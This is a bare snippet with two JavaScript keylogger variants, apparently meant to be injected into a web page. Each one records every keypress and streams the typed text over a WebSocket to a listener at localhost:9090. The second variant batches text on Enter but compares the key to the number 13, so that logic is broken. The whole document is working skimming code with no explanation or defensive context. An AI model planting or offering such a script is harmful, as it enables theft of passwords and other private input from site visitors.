// Option 1 All Keys
<script type="text/javascript">
  var socket = new WebSocket('ws://localhost:9090');
  let c = "";
  document.onkeypress = function (e) {
    c += e.key;
    socket.send(c);
  }
</script>

// Option 2
<script type="text/javascript">
  var socket = new WebSocket('ws://localhost:9090');
  let c = "";
  document.onkeypress = function (e) {
    if(e.key == 13) {
      socket.send(c);
      c = ""
    }
    else
      c += e.key;
  }
</script>
